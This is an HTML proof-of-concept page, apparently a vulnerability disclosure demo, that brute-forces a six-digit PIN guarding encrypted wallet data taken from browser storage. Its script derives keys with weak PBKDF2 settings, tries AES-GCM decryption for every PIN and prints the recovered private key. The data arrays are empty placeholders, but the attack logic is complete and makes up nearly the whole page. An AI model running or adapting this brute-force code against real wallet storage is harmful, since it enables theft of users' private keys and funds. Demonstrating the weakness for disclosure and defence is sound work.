<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>PoC: Critical Security Vulnerability</title>
    <style>
        body { font-family: sans-serif; padding: 20px; background: #f4f4f4; }
        #log { background: #000; color: #0f0; padding: 20px; height: 350px; overflow-y: scroll; font-family: monospace; }
        .success { color: #fff; background: #d9534f; padding: 10px; font-weight: bold; }
    </style>
</head>
<body>
    <h3>Vulnerability Proof of Concept</h3>
    <p>Target: <b>Offline Brute-Force Attack</b> on Encrypted Wallet Storage.</p>
    <button onclick="executeExploit()">Run Full Decryption Attack</button>
    <div id="log" style="margin-top:10px;">System ready. Awaiting command...</div>

    <script>
        // Real-world scenario: Data extracted from IndexedDB/LocalStorage
        const encryptedBlob = new Uint8Array([/* Simulated Encrypted Wallet Data */]); 
        const salt = new Uint8Array([/* Stored Salt */]);
        const iv = new Uint8Array([/* Stored IV */]);

        async function executeExploit() {
            const log = document.getElementById('log');
            log.innerHTML = "Initializing attack...<br>";

            for (let i = 0; i <= 999999; i++) {
                const pin = i.toString().padStart(6, '0');
                
                try {
                    // Logic: Deriving key from PIN and attempting to decrypt
                    const key = await deriveKey(pin, salt);
                    const decrypted = await crypto.subtle.decrypt({name: "AES-GCM", iv}, key, encryptedBlob);
                    
                    // Impact: The Private Key is successfully recovered in plaintext
                    const privateKey = new TextDecoder().decode(decrypted);
                    log.innerHTML += `<div class="success">CRITICAL: PIN FOUND: ${pin}</div>`;
                    log.innerHTML += `<div>RECOVERED PRIVATE KEY: ${privateKey}</div>`;
                    return; 
                } catch(e) {
                    if (i % 1000 === 0) log.innerHTML = `Brute-forcing PIN: ${pin}...`;
                }
            }
        }

        async function deriveKey(pin, salt) {
            const enc = new TextEncoder();
            const keyMaterial = await crypto.subtle.importKey("raw", enc.encode(pin), "PBKDF2", false, ["deriveKey"]);
            return crypto.subtle.deriveKey({
                name: "PBKDF2", salt, iterations: 100, hash: "SHA-256"
            }, keyMaterial, {name: "AES-GCM", length: 256}, false, ["decrypt"]);
        }
    </script>
</body>
